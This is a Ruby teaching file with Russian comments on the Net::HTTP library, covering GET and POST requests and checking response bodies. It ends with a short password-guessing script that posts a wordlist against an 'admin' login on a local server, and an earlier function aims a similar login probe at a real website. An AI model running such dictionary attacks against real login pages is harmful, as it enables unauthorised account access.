puts '                                        Библиотека Net::HTTP'

# GET(запрос(request) от браузера серверу на получение данных) - запрос о том что браузер хочет получить какую-то страницу(ресурс) так же он содержит о кодировках и языках поддерживаемых браузером. На этот запрос от сервера приходит ответ в виде данных запрашиваемой страницы/картинки/ресурса(ее html/css/... код) или об ошибке и некорректности запроса(например 404 страница не найдена)
# POST(запрос(request) от браузера серверу на отправку данных на сервер) - используется для отправки браузером данных на сервер(например ввод пароля). так же содержит служебную информацию
# SERVER(от слова служить) - сервер только обслуживает и сам никому ничего не отправляет, а только возвращает на наш запрос

# Fiddler - прога для просмотра запросов(бесплатная). Устанавливается как прокси сервер, позволяет видеть все подключения и данные запросов.(https://vimeo.com/102869014 урок18)

# rfc http - http://lib.ru/WEBMASTER/rfc2068/ - документация для http можно изучить как работает http протокол

# https://ruby-doc.org/stdlib-3.1.2/libdoc/net/http/rdoc/Net/HTTP.html - документация к библиотеке Net::HTTP


puts
puts '                                              Get запрос'

# Получить страницу по некому адресу и вывести ее на экран. Вариант1
require 'net/http'  # загрузка библиотеки(модуля) Net::HTTP #require-требовать
# теперь из модуля Net обращаемся к классу HTTP и его методу get
page = Net::HTTP.get('krdprog.ru', '/index.html')  # метод get принимает 2 параметра 1 название домена и 2 путь по которому расположена сама страница
puts page #=> Получаем HTML код запрашиваемой страницы


# Вариант 2
# не очень удобно выводить длинные строки параметров ('krdprog.ru', '/index.html'). Есть вариант проще когда есть ссылка
require 'net/http'
require 'uri'
uri = URI.parse "http://krdprog.ru/index.html" # помещаем в переменную новый объект созданный стат методом(URI - универсальный идентификатор ресурса / Universal Resource Identifier). Он называется так потому, что содержит в себе("http://localhost:4567/login﻿") 4 составляющих: протокол (http), имя хоста (localhost), порт (4567), путь (/login)
response = Net::HTTP.get uri # теперь этот объект мы может задать параметром
puts response  #=> Получаем HTML код запрашиваемой страницы


puts
puts '                                              Post запрос'

# За отправку данных(например логина и пароля) (POST запрос) отвечает метод post_form класса Class: Net::HTTP
require 'net/http'
require 'uri'
# передаем методу post_form параметрами URI и хэш
Net::HTTP.post_form( URI.parse('http://www.example.com/search.cgi'), {"login"=>"ruby","password"=>"50"} ) # можно использовать как символы так и строки данные в виде хэша отправляются как q=ruby&max=50
# Возвращается объект


#Вариант 2
require 'net/http'
require 'uri'
uri = URI.parse "https://duckduckgo.com/index.html"
# Делаем POST запрос/отправляем форму(как бы нажимаем кнопку ввести например логин и пароль)
response = Net::HTTP.post_form(uri, :x => "ruby") # передаем объект uri и хэш с данными для POST запроса
puts response # Запрос возвращает объект с которым можно делать всякое например:
# оператор body который выводит html код страницы из oбъекта uri
puts response.body # можно записать и тут response = Net::HTTP.post_form(uri, :x => "ruby").body


puts
# Проверяем при помощи оператора include? закрыт ли доступ('denied' в данном примере код страницы содержит именно такое значение если доступ закрыт) или нет после пост запрса с логином и паролем
require 'net/http'
require 'uri'
uri = URI.parse "https://rubyschool.us/router"
response = Net::HTTP.post_form(uri, login: 'aaa', password: 'ruby').body # оператор body можно ставить сразу тут
puts response.include?('denied') #=> true или false


# Вариант 2: оформляем проверку доступа в виде функции
require 'net/http'
require 'uri'

def is_wrong_password? password
  uri = URI.parse "https://rubyschool.us/router"
  response = Net::HTTP.post_form(uri, login: 'admin', password: password).body # передаем параметр в пост запрос
  response.include?('denied') # проверку просто возвращаем
end
puts is_wrong_password? 'qwerty11' #проверяем пароль


puts
# Подбираем пароль при помощи запросов и програмы подборщика паролей
require 'net/http'
require 'uri'

def is_wrong_password? password
  uri = URI.parse "http://localhost:4567/login﻿"
  response = Net::HTTP.post_form(uri, username﻿: 'admin', password: password).body
  response.include?('Wrong username or password, please try again')
end

def find_password
  input = File.open("passwords.txt", "r")
  	while (line = input.gets)
      unless is_wrong_password? line.strip # передаем пароль в метод is_wrong_password? получаем true если неверный
        return line.strip
      end
      puts
  	end
  input.close
end
puts "Password is #{find_password}"
